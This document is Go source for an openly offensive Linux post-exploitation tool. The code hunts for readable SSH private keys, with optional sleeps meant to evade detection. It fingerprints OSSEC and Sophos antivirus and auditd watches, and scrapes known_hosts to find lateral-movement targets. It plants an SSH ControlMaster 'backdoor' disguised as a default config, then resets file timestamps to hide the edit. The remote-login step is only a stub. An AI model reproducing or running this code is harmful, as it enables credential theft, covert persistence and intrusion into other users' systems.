package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	osuser "os/user"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	//"golang.org/x/crypto/ssh"
	//"golang.org/x/crypto/ssh/agent"
	utmp "github.com/EricLagergren/go-gnulib/utmp"
	netstat "github.com/drael/GOnetstat"
	ps "github.com/unixist/go-ps"
	netlink "github.com/vishvananda/netlink"
	"github.com/willdonnelly/passwd"
)

// CLI flags
var (
	// Passive recon
	flag_gatt             = flag.Bool("gatt", false, "Get all the things. This flag only performs one-time read actions, e.g. --av, and --who.")
	flag_pkeys            = flag.Bool("pkeys", false, "Detect private keys")
	flag_pkey_dirs        = flag.String("pkey-dirs", "/root,/home", "Comma-separated directories to search for private keys. Default is '/root,/home'. Requires --pkeys.")
	flag_pkey_sleep       = flag.Int("pkey-sleep", 0, "Length of time in milliseconds to sleep between examining files. Requires --flag_pkey_dirs.")
	flag_av               = flag.Bool("av", false, "Check for signs of A/V services running or present.")
	flag_container        = flag.Bool("container", false, "Detect if this system is running in a container. [UNRELIABLE]")
	flag_net              = flag.Bool("net", false, "Grab IPv4 and IPv6 networking connections.")
	flag_watches          = flag.Bool("watches", false, "Grab which files/directories are being watched for modification/access/execution.")
	flag_arp              = flag.Bool("arp", false, "Grab ARP table for all devices.")
	flag_who              = flag.Bool("who", false, "List who's logged in and from where.")
	// Passive recon over time
	flag_poll_net         = flag.Bool("pollnet", false, "Long poll for networking connections and a) output a summary; or b) output regular connection status. [NOT IMPLEMENTED]")
	flag_poll_users       = flag.Bool("pollusers", false, "Long poll for users that log into the system. [NOT IMPLEMENTED]")
	flag_stalk_luser      = flag.String("stalk-luser", "", "Wait until a user logs in locally and log it. Use \"*\" to match any user.")

	// Active - backdoor
	flag_ssh_cm           = flag.String("ssh-cm", "", "Set user's $HOME/.ssh/config to include a ControlMaster directive for passwordless piggybacking.")
	flag_rm_ssh_cm        = flag.String("rm-ssh-cm", "", "Undo --ssh-cm. If the config file is empty after the undo, it will be removed.")
	// Active - lateral movement
	flag_stalk_ruser      = flag.String("stalk-ruser", "", "Wait until a user logs in locally and attempt to also log into that host.")
	flag_stalk_ruser_cmd  = flag.String("stalk-ruser-cmd", "", "Command to execute on remote host after successful login.")
)

var (
	// Antivirus systems we detect
	AVSystems = []AVDiscoverer{
		OSSECAV{name: "OSSEC"},
		SophosAV{name: "Sophos"},
	}
	// The typical location where auditd looks for its ruleset
	AuditdRules = "/etc/audit/audit.rules"
	// The typical location utmp stores login information
	UtmpPath                  = "/var/run/utmp"
	SSHControlMasterDirective = `Host *  # Default config. Do not edit below this line.
        ControlPath ~/.ssh/.config
        ControlMaster auto
        ControlPersist 10m`
)

// string parameter is the user who logged into this system.
type localLoginStalkAction func(string, netConn) error
// string parameter is the user who logged into a remote system.
type remoteLoginStalkAction func(string, netConn) error

type sshPrivateKey struct {
	path      string
	encrypted bool
}

const (
  L4ProtoTcp = iota
  L4ProtoUdp = iota
)

const (
  L3ProtoIpv4 = iota
  L3ProtoIpv6 = iota
)

type netConn struct {
  srcIp    string
  dstIp    string
  srcPort  int64
  dstPort  int64
  l3Proto  int  // If this is false, connection is ipv6
  l4Proto  int
}

// watch holds the information for which the system is attempting to detect access.
type watch struct {
	// Path being watched.
	path string
	// Action the watch is looking for, i.e. read/write/execute. For example "wa" would detect file writes or appendages.
	action string
}

type who struct {
	// Username, line (tty/pty), originating host that user is logging in from
	user, line, host string
	// User's login process ID. Typically sshd process
	pid int32
	// Login time
	time int32
}

type process struct {
	pid  int
	name string
}
type loadedKernelModule struct {
	address string
	size    int
	name    string
}

type OSSECAV struct {
	AVDiscoverer
	name string
}

type SophosAV struct {
	AVDiscoverer
	name string
}

// Each AV system implements this interface to expose artifacts of the detected system.
type AVDiscoverer interface {
	// Filesystem paths of binaries
	Paths() []string
	// Running processes
	Procs() []process
	// Loaded kernel modules
	KernelModules() []loadedKernelModule
	// Name of the AV system
	Name() string
}

func (o OSSECAV) Paths() []string {
	return existingPaths([]string{
		"/var/ossec",
	})
}

func (o OSSECAV) Procs() []process {
	return runningProcs([]string{
		"ossec-agentd",
		"ossec-syscheckd",
	})
}

// KernelModules returns an empty list as OSSEC doesn't use kernel modules.
func (o OSSECAV) KernelModules() []loadedKernelModule {
	return []loadedKernelModule{}
}

func (o OSSECAV) Name() string {
	return o.name
}

func (s SophosAV) Paths() []string {
	return existingPaths([]string{
		"/etc/init.d/sav-protect",
		"/etc/init.d/sav-rms",
		"/lib/systemd/system/sav-protect.service",
		"/lib/systemd/system/sav-rms.service",
		"/opt/sophos-av",
	})
}

func (s SophosAV) Procs() []process {
	return runningProcs([]string{
		"savd",
		"savscand",
	})
}

func (o SophosAV) KernelModules() []loadedKernelModule {
	return []loadedKernelModule{}
}

func (o SophosAV) Name() string {
	return o.name
}

// existingPaths returns a subset of paths that exist on the filesystem.
func existingPaths(paths []string) []string {
	found := []string{}
	for _, path := range paths {
		if _, err := os.Stat(path); err == nil {
			found = append(found, path)
		}
	}
	return found
}

// runningProcs returns a subset of processes that are currently running.
func runningProcs(procs []string) []process {
	allProcs, _ := ps.Processes()
	found := []process{}
	for _, aproc := range allProcs {
		procName := aproc.Executable()
		for _, need := range procs {
			if need == procName {
				found = append(found, process{
					pid:  aproc.Pid(),
					name: procName,
				})
			}
		}
	}
	return found
}

// establishConns grabs currently established network connections
// and looks for the connection characteristics in "needle".
func establishedConns(conns []netConn, needle netConn) []netConn {
  found := []netConn{}

  for _, nc := range conns {
    if needle.srcIp != "" && needle.srcIp != nc.srcIp {
      continue
    }
    if needle.dstIp != "" && needle.dstIp != nc.dstIp {
      continue
    }
    if needle.srcPort != 0 && needle.srcPort != nc.srcPort {
      continue
    }
    if needle.dstPort != 0 && needle.dstPort != nc.dstPort {
      continue
    }
    if needle.l3Proto != 0 && needle.l3Proto != nc.l3Proto {
      continue
    }
    if needle.l4Proto != 0 && needle.l4Proto != nc.l4Proto {
      continue
    }
    found = append(found, nc)
  }

  return found
}

// getPrivateKey extracts a sshPrivateKey object from a string if a key exists.
func getPrivateKey(path string) sshPrivateKey {
	p := sshPrivateKey{}
	f, err := os.Open(path)
	// If we don't have permission to open the file, skip it.
	if err != nil {
		return p
	}
	defer f.Close()
	head := make([]byte, 32)
	_, err = f.Read(head)
	if err != nil {
		return p
	}
	if matched, _ := regexp.Match("-----BEGIN .* PRIVATE KEY-----\n", head); !matched {
		return p
	}
	// This is a private key. Let's find out if it's encrypted
	br := bufio.NewReader(f)
	line, err := br.ReadString('\n')
	if err != nil {
		return p
	}
	p = sshPrivateKey{
		path:      path,
		encrypted: strings.HasSuffix(line, "ENCRYPTED\n"),
	}
	return p
}

// getSSHKeys looks for readable ssh private keys. Optionally sleep for `sleep`
// milliseconds to evade detection.
func getSSHKeys(dir string, sleep int) []sshPrivateKey {
	pkeys := []sshPrivateKey{}
	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if sleep != 0 {
			time.Sleep(time.Duration(sleep) * time.Millisecond)
		}
		if info == nil || !info.Mode().IsRegular() {
			return nil
		}
		pkey := getPrivateKey(path)
		if pkey != (sshPrivateKey{}) {
			pkeys = append(pkeys, pkey)
		}
		return nil
	})
	return pkeys
}

// isContainer looks at init's cgroup and total process count to guess at
// whether we're in a container. These are basically informed *guesses*.
func isContainer() bool {
	procs, err := ps.Processes()
	if err != nil {
		return false
	}
	if len(procs) <= 10 {
		return true
	}
	t, err := ioutil.ReadFile("/proc/1/cgroup")
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(t), "\n") {
		if line == "" {
			break
		}
		if strings.Index(line, "docker") != -1 {
			return true
		} else if !strings.HasSuffix(line, ":/") {
			return true
		}
	}
	return false
}

// getArp fetches the current arp table, the map between known MACs and their IPs
func getArp() []netlink.Neigh {
	neighs, err := netlink.NeighList(0, 0)
	if err != nil {
		return []netlink.Neigh{}
	} else {
		return neighs
	}
}

func isUserLoggedIn(user string) bool {
	for _, w := range getWho() {
		if w.user == user {
			return true
		}
	}
	return false
}

// getWho fetches information about currently logged-in users.
func getWho() []who {
	found := []who{}
	utmps, err := utmp.ReadUtmp(UtmpPath, utmp.LoginProcess)
	if err != nil {
		return found
	}
	for _, u := range utmps {
		found = append(found, who{
			user: string(bytes.Trim(u.User[:], "\x00")),
			host: string(bytes.Trim(u.Host[:], "\x00")),
			line: string(bytes.Trim(u.Line[:], "\x00")),
			pid:  u.Pid,
			time: u.Tv.Sec,
		})
	}
	return found
}

// getWatches fetches a list of watches that auditd currently has on filesystem paths.
func getWatches() ([]watch, error) {
	re := regexp.MustCompile("-w ([^[:space:]]+).* -p ([[:alpha:]]+)")
	t, err := ioutil.ReadFile(AuditdRules)
	found := []watch{}
	if err != nil {
		return nil, fmt.Errorf("Unable to open %v", AuditdRules)
	}
	for _, line := range strings.Split(string(t), "\n") {
		matches := re.FindStringSubmatch(line)
		if len(matches) == 3 {
			found = append(found, watch{
				path:   matches[1],
				action: matches[2],
			})
		}
	}
	return found, nil
}

func getNetworkConnections() []netConn {
  found := []netConn{}

  for _, conn := range netstat.Tcp() {
    if conn.State == "ESTABLISHED" {
      found = append(found, netConn{
        srcIp: conn.Ip,
        dstIp: conn.ForeignIp,
        srcPort: conn.Port,
        dstPort: conn.ForeignPort,
        l3Proto: L3ProtoIpv4,
        l4Proto: L4ProtoTcp,
      })
    }
  }
  for _, conn := range netstat.Udp() {
    if conn.State == "ESTABLISHED" {
      found = append(found, netConn{
        srcIp: conn.Ip,
        dstIp: conn.ForeignIp,
        srcPort: conn.Port,
        dstPort: conn.ForeignPort,
        l3Proto: L3ProtoIpv4,
        l4Proto: L4ProtoUdp,
      })
    }
  }
  for _, conn := range netstat.Tcp6() {
    if conn.State == "ESTABLISHED" {
      found = append(found, netConn{
        srcIp: conn.Ip,
        dstIp: conn.ForeignIp,
        srcPort: conn.Port,
        dstPort: conn.ForeignPort,
        l3Proto: L3ProtoIpv6,
        l4Proto: L4ProtoTcp,
      })
    }
  }
  for _, conn := range netstat.Udp6() {
    if conn.State == "ESTABLISHED" {
      found = append(found, netConn{
        srcIp: conn.Ip,
        dstIp: conn.ForeignIp,
        srcPort: conn.Port,
        dstPort: conn.ForeignPort,
        l3Proto: L3ProtoIpv6,
        l4Proto: L4ProtoUdp,
      })
    }
  }

  return found
}

func sshLoginWithAgent(user string, conn netConn) error {
	return nil
}

// sshKnownHosts attempts to fetch all the known_hosts files for all users on
// the system. It will fail in two cases: lack of permission; and hashed hosts.
func sshKnownHosts() []netConn {
	found := []netConn {}
	entries, _ := passwd.Parse()

	// Loop over all the users on the system and scrape their known_hosts file
	for _, e := range entries {
		filename := filepath.Join(e.Home, ".ssh/known_hosts")
		if _, err := os.Stat(filename); err != nil {
			continue
		}
		body, err := ioutil.ReadFile(filename)
		if err != nil {
			continue
		}
		for _, line := range strings.Split(string(body), "\n") {
			if line == "" {
				break
			}
			if strings.Index(line, "|") == 0 { // Hosts may be hashed
				continue
			}
			hosts := strings.Split(line, " ")[0]
			// Grab all the comma-separated hosts/IPs in the first column. Since known_hosts
			// doesn't have port information, we'll have to assume tcp/22.
			for _, host := range strings.Split(hosts, ",") {
				found = append(found, netConn{
					dstIp: host,
					dstPort: 22,
					l4Proto: L4ProtoTcp,
				})
			}
		}
	}

	return found
}

// getCandidateRLogins gets likely list of hosts the user has SSH access to.
// This basically boils down to getting of a list of established connections to
// remote hosts on tcp/22.
func getCandidateRLogins() ([]netConn) {
  conns := getNetworkConnections()
  return append(establishedConns(conns, netConn{
    dstPort: 22,
    l4Proto: L4ProtoTcp,
  }), sshKnownHosts()...)
}

func getSSHControlMasterFilename(user string) (string, error) {
	u, err := osuser.Lookup(user)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("%s/.ssh/.config", u.HomeDir), nil
}

func getSSHConfigFilename(user string) (string, error) {
	u, err := osuser.Lookup(user)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("%s/.ssh/config", u.HomeDir), nil
}

func isSSHControlMasterActive(user string) bool {
	filename, _ := getSSHControlMasterFilename(user)
	s, err := os.Stat(filename)
	if err == nil {
		if time.Since(s.ModTime()) < time.Duration(20*time.Minute) {
			return true
		}
	}
	return false
}

// setSSHControlMaster places a ControlMaster directive in the user's ssh config file.
// bool return value is true if the config file is created, false if it already exists.
// If err != nil, bool return value can't be trusted.
func setSSHControlMaster(user string) (bool, error) {
	var origTime = time.Now()
	var created = false
	filename, err := getSSHConfigFilename(user)
	if s, err := os.Stat(filename); err == nil {
		origTime = s.ModTime()
	} else {
		created = true
	}
	if err != nil {
		return created, err
	}
	// Either create the config file or append to it
	// TODO: if the file is created, then unsetSSHControlMaster() should remove it.
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return created, err
	}
	defer f.Close()

	f.WriteString(SSHControlMasterDirective + "\n")

	// Replace the original access and modification times.
	if err := os.Chtimes(filename, origTime, origTime); err != nil {
		fmt.Println("Couldn't reset atime/mtime on ssh config file.")
	}
	return created, nil
}

// unsetSSHControlMaster removes the ControlMaster directive from user's ssh config file
func unsetSSHControlMaster(user string) error {
	var origTime = time.Now()
	filename, err := getSSHConfigFilename(user)
	if err != nil {
		return err
	}
	if s, err := os.Stat(filename); err == nil {
		origTime = s.ModTime()
	}

	// Snarf in the whole file and search lines for our distinct "Host *" line.
	body, err := ioutil.ReadFile(filename)
	if err != nil {
		// Somehow the config was removed. Panic.
		return err
	}
	// Janky means of munging the config file back to its original state
	newFile := ""
	toSkip := len(strings.Split(SSHControlMasterDirective, "\n"))
	haveSkipped := 0
	for _, line := range strings.Split(string(body), "\n") {
		if line == "Host *  # Default config. Do not edit below this line." {
			haveSkipped += 1
		}
		// We'll skip a maximum of three lines
		if haveSkipped > 0 && haveSkipped <= toSkip {
			haveSkipped += 1
		} else {
			newFile += line + "\n"
		}
	}
	// We didn't find our Control Master. In this case, we either hadn't yet set Control Master
	// or it has since been removed. Either way, don't modify the config file. Just bail.
	if haveSkipped == 0 {
	} else if newFile == "\n" {
		// or if after removing the directive there is no other content, remove the file. This is a guess that
		// it was create by us.
		if err := os.Remove(filename); err != nil {
			return err
		}
		return nil
	}

	// This hack removes potentially multiple trailing newlines and replaces it with just a single newline.
	// This doesn't leave things *exactly* as they were prior to injecting the Control Master.
	// (In cases where removing the ControlMaster directive would result in multiple legit newlines. This
	// is improbable.)
	newFile = strings.TrimRight(newFile, "\n")
	newFile += "\n"

	// Create temp file, write the new contents, then replace user's config file with this new one.
	tmp, err := ioutil.TempFile(filepath.Dir(filename), "tmp")
	defer tmp.Close()
	if err != nil {
		fmt.Println("Can't unset SSH Control Master")
		return err
	}

	// Create the new config without the Control Master directive.
	if _, err := tmp.WriteString(newFile); err != nil {
		fmt.Println("Unable to create new config in temp file")
		return err
	}

	// Move the new config into place.
	if err := os.Rename(tmp.Name(), filename); err != nil {
		fmt.Println("Error placing new config", err)
		return err
	}

	// Replace the original access and modification times.
	if err := os.Chtimes(filename, origTime, origTime); err != nil {
		// Even if we can't update the times, don't return an error since the primary
		// objective of this function is successful.
		fmt.Println("Couldn't reset atime/mtime on ssh config file")
	}
	return nil
}

// stalkLocalLogin performs an action when a specific user logs in at any point in the future.
// If user == "*", any user will trigger the action.
func stalkLocalLogin(user string, action localLoginStalkAction) error {
	start := time.Now()
	ticker := time.NewTicker(1 * time.Second)
	//go func() {
	for {
		select {
		case <-ticker.C:
			for _, w := range getWho() {
				if (user == "*" || user == w.user) && start.Before(time.Unix(int64(w.time), 0)) {
					action(w.user, netConn{
							srcIp: w.host,
					})
					start = time.Now()
				}
			}
			//ticker.Stop()
		}
	}
	//}()
	return nil
}

// stalkRemoteLogin attempts to log into a remote system via two methods:
// 1. If the Control Master socket is recently created, attempt to use it
// 2. If an SSH connection to a remote host is made, attempt to use any keys
//    loaded in the user's ssh-agent.
func stalkRemoteLogin(user string, action remoteLoginStalkAction) error {
	ticker := time.NewTicker(1 * time.Second)
	for {
		select {
		case <-ticker.C:
			if isUserLoggedIn(user) {
				for _, c := range getCandidateRLogins() {
					action(user, netConn{
							dstIp: c.dstIp,
							dstPort: c.dstPort,
					})
				}
			}
		}
	}
	return nil
}

// attemptRemoteLogin will wait for signs that 
func attemptRemoteLogin(user string, conn netConn) error {
	fmt.Printf("Attempting remote login as %s to %s:%d\n", user, conn.dstIp, conn.dstPort)
	return nil
}

func main() {
	flag.Parse()
	if *flag_gatt || *flag_container {
		fmt.Printf("isContainer: %v\n", isContainer())
	}
	if *flag_gatt || *flag_pkeys {
		fmt.Printf("ssh keys:")
		for _, dir := range strings.Split(*flag_pkey_dirs, ",") {
			for _, pkey := range getSSHKeys(dir, *flag_pkey_sleep) {
				fmt.Printf("\n\tfile=%v encrypted=%v", pkey.path, pkey.encrypted)
			}
		}
		fmt.Println("")
	}
	if *flag_gatt || *flag_av {
		fmt.Printf("AV:")
		for _, av := range AVSystems {
			name, paths, procs, mods := av.Name(), av.Paths(), av.Procs(), av.KernelModules()
			if len(paths) > 0 || len(procs) > 0 {
				fmt.Printf("\n\tname=%s files=%v procs=%v, modules=%v", name, paths, procs, mods)
			}
		}
		fmt.Println("")
	}
	if *flag_gatt || *flag_net {
		fmt.Printf("ipv4 connections:")
		for _, conn := range netstat.Tcp() {
			if conn.State == "ESTABLISHED" {
				fmt.Printf("\n\t tcp4: %s:%d <> %s:%d", conn.Ip, conn.Port, conn.ForeignIp, conn.ForeignPort)
			}
		}
		fmt.Println("")
		for _, conn := range netstat.Udp() {
			if conn.State == "ESTABLISHED" {
				fmt.Printf("\n\t udp4: %s:%d <> %s:%d", conn.Ip, conn.Port, conn.ForeignIp, conn.ForeignPort)
			}
		}

		fmt.Printf("\nipv6 connections:")
		for _, conn := range netstat.Tcp6() {
			if conn.State == "ESTABLISHED" {
				fmt.Printf("\n\t tcp6: %s:%d <> %s:%d", conn.Ip, conn.Port, conn.ForeignIp, conn.ForeignPort)
			}
		}
		fmt.Println("")
		for _, conn := range netstat.Udp6() {
			if conn.State == "ESTABLISHED" {
				fmt.Printf("\n\t udp6: %s:%d <> %s:%d", conn.Ip, conn.Port, conn.ForeignIp, conn.ForeignPort)
			}
		}
		fmt.Println("")
	}
	if *flag_gatt || *flag_watches {
		fmt.Printf("Watches:")
		watches, err := getWatches()
		if err != nil {
			fmt.Println("Error checking watches: ", err)
		} else {
			for _, w := range watches {
				fmt.Printf("\n\tpath=%v action=%v", w.path, w.action)
			}
		}
		fmt.Println("")
	}
	if *flag_gatt || *flag_arp {
		fmt.Printf("ARP table:")
		for _, arp := range getArp() {
			fmt.Printf("\n\tmac=%s ip=%s", arp.HardwareAddr, arp.IP)
		}
		fmt.Println("")
	}
	if *flag_gatt || *flag_who {
		fmt.Printf("Logged in:")
		for _, w := range getWho() {
			t := time.Unix(int64(w.time), 0)
			fmt.Printf("\n\tuser=%s host=%s line=%s pid=%d login_time=%d (%s)", w.user, w.host, w.line, w.pid, w.time, t)
		}
		fmt.Println("")
	}
	if *flag_stalk_luser != "" {
		stalkLocalLogin(*flag_stalk_luser, func(user string, conn netConn) error {
			fmt.Printf("User logged in %v: %s@%s\n", time.Now(), user, conn.srcIp); return nil
		})
	}
	if *flag_stalk_ruser != "" {
		stalkRemoteLogin(*flag_stalk_ruser, attemptRemoteLogin)
	}
	if *flag_ssh_cm != "" {
		setSSHControlMaster(*flag_ssh_cm)
	}
	if *flag_rm_ssh_cm != "" {
		unsetSSHControlMaster(*flag_rm_ssh_cm)
	}
}
